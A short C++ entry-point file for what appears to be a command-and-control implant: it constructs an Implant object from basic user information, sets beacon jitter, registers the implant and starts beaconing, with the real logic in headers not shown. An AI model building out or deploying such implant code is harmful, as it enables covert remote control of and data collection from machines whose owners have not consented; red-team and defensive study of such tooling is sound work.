#include <windows.h>
#include <stdio.h>
#include <iostream>

#include "core.h"
#include "Implant.h"
#pragma comment(lib, "ntdll.lib") // Link to ntdll.lib

int main() {
	BasicUserInformation basicUserInfo; // 
	Implant implant = Implant(basicUserInfo);

	implant.setJitter(3000); // Can set this to whatever you want.

	implant.RegisterImplant();
	implant.StartBeacon();

	return 0;
}